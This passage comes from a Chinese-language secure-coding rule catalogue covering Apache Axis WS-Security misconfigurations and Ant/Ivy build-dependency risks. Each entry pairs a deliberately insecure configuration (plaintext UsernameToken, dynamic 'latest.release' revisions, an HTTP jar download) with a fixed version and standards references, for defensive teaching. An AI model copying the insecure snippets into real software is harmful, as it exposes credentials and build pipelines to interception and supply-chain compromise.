<h4 id="Axis-Service-Provider-Misconfiguration-Weak-Token"><a href="#Axis-Service-Provider-Misconfiguration-Weak-Token" class="headerlink" title="Axis Service Provider Misconfiguration: Weak Token"></a>Axis Service Provider Misconfiguration: Weak Token</h4><h5 id="ABSTRACT-172"><a href="#ABSTRACT-172" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若在未经加密的通道上使用 UsernameToken 及明文密码，则可截取 SOAP 消息的攻击者会趁机获取该密码。</p>
<h5 id="EXPLANATION-173"><a href="#EXPLANATION-173" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 UsernameToken 的服务提供程序可能会接受以明文形式发送的密码。若通过未经加密的通道发送明文密码，则可截取 SOAP 消息的攻击者会趁机获取凭证。</p>
<p>下列 Axis 服务提供程序配置使用了此 UsernameToken：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;action&quot; value=&quot;UsernameToken&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/deployment&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-172"><a href="#RECOMMENDATIONS-172" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>要求使用签名，而不是 UsernameToken。下面提供了一个配置示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;action&quot; value=&quot;Timestamp Signature Encrypt&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/deployment&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-171"><a href="#REFERENCES-171" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[2] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[4] Standards Mapping - FIPS200 MP</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.8, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-Service-Requester-Misconfiguration-Plain-Text-Password"><a href="#Axis-Service-Requester-Misconfiguration-Plain-Text-Password" class="headerlink" title="Axis Service Requester Misconfiguration: Plain Text Password"></a>Axis Service Requester Misconfiguration: Plain Text Password</h4><h5 id="ABSTRACT-173"><a href="#ABSTRACT-173" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>避免使用 WS-Security 密码类型 PasswordText。</p>
<h5 id="EXPLANATION-174"><a href="#EXPLANATION-174" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 PasswordText 密码类型，可能表示实际密码是以明文发送的。WS-Security UsernameToken 配置文件指明 <code>UsernameToken &lt;Password&gt;</code> 标签中发送的文本不限于实际密码。它们还可能是派生的密码。然而，开发人员通常发送的是实际密码而不是派生的密码。发送未经加密的密码或密码散列值，都会将凭证泄漏给可以截取信息流的任何人。</p>
<h5 id="RECOMMENDATIONS-173"><a href="#RECOMMENDATIONS-173" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>采用 PasswordDigest 密码类型，确保凭证在发送时已加密。采用 HTTPS 协议发送 SOAP 消息能确保凭证得到强大加密技术的保护，但如果消息将采用多种传输方式进行转发，更好的选择是使用 WS-Security 对消息自身进行加密。</p>
<p>下面提供了客户端配置，密码类型设为 PasswordDigest。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  &lt;requestFlow&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;passwordType&quot; value=&quot;PasswordDigest&quot; /&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/deployment&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-172"><a href="#REFERENCES-172" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 522</p>
<p>[3] Standards Mapping - FIPS200 MP</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.8, Requirement 8.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260.1 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-Service-Requester-Misconfiguration-Weak-Token"><a href="#Axis-Service-Requester-Misconfiguration-Weak-Token" class="headerlink" title="Axis Service Requester Misconfiguration: Weak Token"></a>Axis Service Requester Misconfiguration: Weak Token</h4><h5 id="ABSTRACT-174"><a href="#ABSTRACT-174" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若在未经加密的通道上使用 UsernameToken 及明文密码，则可截取 SOAP 消息的攻击者会趁机获取该密码。</p>
<h5 id="EXPLANATION-175"><a href="#EXPLANATION-175" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>若通过未经加密的通道发送明文密码或密码散列值，则可截取 SOAP 消息的攻击者会趁机获取凭证。</p>
<p>下列 Axis 客户端配置使用了此 UsernameToken：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;action&quot; value=&quot;UsernameToken&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/deployment&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-174"><a href="#RECOMMENDATIONS-174" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则使用签名而非 UsernameToken。下面提供了一个配置示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;action&quot; value=&quot;Timestamp Signature Encrypt&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/deployment&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-173"><a href="#REFERENCES-173" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[2] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[4] Standards Mapping - FIPS200 MP</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.8, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260.1 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Build-Misconfiguration-Dynamic-Dependency-Version-Usage"><a href="#Build-Misconfiguration-Dynamic-Dependency-Version-Usage" class="headerlink" title="Build Misconfiguration: Dynamic Dependency Version Usage"></a>Build Misconfiguration: Dynamic Dependency Version Usage</h4><h5 id="ABSTRACT-175"><a href="#ABSTRACT-175" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>用一个动态版本检索编译 dependency 会使 build system 易受恶意二进制码的侵害，或者造成系统发生意外行为。</p>
<h5 id="EXPLANATION-176"><a href="#EXPLANATION-176" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>利用 Apache Ivy 自动化的 dependency 管理系统，用户能够为 dependency 指定一种称为动态修订的版本状态，而不是列出特定版本。如果攻击者能够危害 dependency 存储库，或哄骗 build system 从攻击者所控制的一个存储库下载 dependency，那么，build system 可能唯一做的就是不经任何提示地下载一个动态修订说明符，并运行受到危害的 dependency。除了安全上的风险以外，动态修订还会为 code quality 引入了一种额外的风险因素：动态修订使软件的安全性和稳定性受控于第三方，即，在开发和发布软件所使用的 dependency 的那一方。</p>
<p>在编译过程中，Ivy 将连接到存储库，并尝试检索与所列状态匹配的 dependency。</p>
<p>Ivy 接受下面的动态修订说明符：</p>
<ul>
<li><p>latest.integration：选择 dependency 模块的最新修订版。</p>
</li>
<li><p>latest.[any status]：选择至少处于指定状态的 dependency 模块的最新修订版。例如，latest.milestone 会选择最新版本，要么是一个重要的修订版本，要么是一个发布版。而 latest.release 只会选择最新发布版。</p>
</li>
<li><p>任何以 + 结束的修订：选择 dependency 模块的最新子修订。例如，如果 dependency 存在于修订版 1.0.3、1.0.7 和 1.1.2 中，则指定为 1.0.+ 的修订版将选择修订版 1.0.7。</p>
</li>
<li><p>版本范围：表示范围的数学符号，例如 &lt; 和 &gt;，可以用来匹配一个版本范围。</p>
</li>
</ul>
<p>例 1：下面的配置项将指示 Ivy 检索 clover 组件的最新发布版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency org=&quot;clover&quot; name=&quot;clover&quot;</span><br><span class="line"></span><br><span class="line">                    rev=&quot;latest.release&quot; conf=&quot;build-&gt;*&quot;/&gt;</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>如果存储库受到危害，攻击者就很容易上传一个符合动态标准的版本，从而造成 Ivy 下载一个恶意的 dependency 版本。</p>
<h5 id="RECOMMENDATIONS-175"><a href="#RECOMMENDATIONS-175" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为降低安全风险，请始终列出每项 dependency 的一个特定版本。如果不这样做，就会将不一致风险引入系统（没有一种快捷的方法可以指出哪个 dependency 版本会被合并到发布版中）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency org=&quot;clover&quot; name=&quot;clover&quot;</span><br><span class="line"></span><br><span class="line">                    rev=&quot;1.3.9&quot; conf=&quot;build-&gt;*&quot;/&gt;</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-174"><a href="#REFERENCES-174" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<h4 id="Build-Misconfiguration-External-Ant-Dependency-Repository"><a href="#Build-Misconfiguration-External-Ant-Dependency-Repository" class="headerlink" title="Build Misconfiguration: External Ant Dependency Repository"></a>Build Misconfiguration: External Ant Dependency Repository</h4><h5 id="ABSTRACT-176"><a href="#ABSTRACT-176" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>这一 Ant 编译脚本依赖于外部数据源，这会导致攻击者能够将恶意代码插入最终产品中，或者控制编译计算机。</p>
<h5 id="EXPLANATION-177"><a href="#EXPLANATION-177" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 开发环境内存在的几个工具能够辅助 dependency 管理：Apache Ant 和 Apache Maven 两种 build system 都包含专门用来帮助管理 dependency 的功能，Apache Ivy 被明确作为 dependency 管理器来部署。尽管这些工具在行为方式上存在差异，但它们都有一种通用的功能，即会自动下载在编译过程中指定的外部 dependency。这样一来，两个不同的开发人员用同一种方式来编译软件就容易得多。开发人员只需在编译文件中存储 dependency 信息，这意味着每个开发人员和编译工程师都通过同一种方式来获得 dependency、编译代码以及进行部署，而不需要进行混乱的手动 dependency 管理。以下的例子演示了如何使用 Ivy、Ant 和 Maven 作为编译过程的一部分来管理外部 dependency。</p>
<p>开发人员用一项 <get> 任务，在一个 Ant 目标中指定了外部 dependency，以检索由相应 URL 指定的 dependency。这个方法与以下情形在功能上是等效的：开发人员证明每一项外部 dependency 为软件项目中附带的一项内容，但却是非常必要的，因为它可以在执行编译时自动提取和合并 dependency。</get></p>
<p>示例：以下内容摘自 Ant build.xml 配置文件，这些内容显示了对某一外部 dependency 的典型引用方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;get src=&quot;http://people.apache.org/repo/m2-snapshot-repository/org/apache/openejb/openejb-jee/3.0.0-SNAPSHOT/openejb-jee-3.0.0-SNAPSHOT.jar&quot;</span><br><span class="line"></span><br><span class="line">dest=&quot;$&#123;maven.repo.local&#125;/org/apache/openejb/openejb-jee/3.0.0-SNAPSHOT/openejb-jee-3.0.0-SNAPSHOT.jar&quot;</span><br><span class="line"></span><br><span class="line">usetimestamp=&quot;true&quot; ignoreerrors=&quot;true&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>两种截然不同的攻击情形会影响这些系统：攻击者可能会危害托管 dependency 的服务器，也可能危害 DNS 服务器，编译计算机用它将对托管 dependency 的服务器主机名的请求重定向到被攻击者控制的计算机。这两种攻击情形都会导致攻击者能够将恶意的 dependency 版本注入到一个未受到危害的计算机上所运行的编译中。</p>
<p>不管攻击者用来投递 Trojan dependency 的攻击手段是什么，这些情形均存在一种共同的因素，即 build system 盲目地接受恶意二进制码并且将其包含在编译中。因为 build system 无法拒绝恶意的二进制码和现有安全机制（如代码审查），所以通常会关注内部开发地代码而不是外部 dependency，这种攻击深潜于内部，不易察觉，它会传播到开发环境各处并有可能传入产品中。</p>
<p>虽然手动编译过程中存在一定的 dependency 受到危害的风险，但是由于自动化 build system 存在从一个外部数据源检索 dependency 的趋势，每当 build system 运行在新环境下时，会大大增加攻击者的攻击机会。攻击者只需在 dependency 服务器或 DNS 服务器多次提取 dependency 时造成一次危害，即会危害发生编译的计算机。</p>
<h5 id="RECOMMENDATIONS-176"><a href="#RECOMMENDATIONS-176" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>最简单的解决方法是完全避免采用自动化 dependency 管理系统。手动管理 dependency 排除了由 build system 引起意外行为这一潜在危害。很显然，攻击者仍然能针对 dependency 手动检索发动上述攻击之一，但限制 dependency 的检索频率会大大减小攻击者的攻击机会。最终，这个解决方法会致使开发组织依赖于一个看起来陈旧的 build system。基于手动 dependency 管理的系统通常更难以使用和维护，并且在一些软件开发环境中可能不被接受。</p>
<p>第二种解决方法综合了传统的手动 dependency 管理方法和全自动化解决方法，这是现在流行的一种做法。手动编译过程的最大优势是减小了攻击机会，它可以通过从内部复制外部 dependency 服务器来实现一个半自动化系统。这样，任何需要利用外部 dependency 的 build system 都能用硬编码的内部 IP 地址来指向内部服务器，以此避开基于 DNS 的攻击风险。如果添加了新的 dependency 并发布了新的版本，可以一次性下载它们，并将其包含在内部存储库中。这一解决方法减小了攻击机会，并且使组织能够充分利用现有的内部网络安全基础架构。</p>
<h5 id="REFERENCES-175"><a href="#REFERENCES-175" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
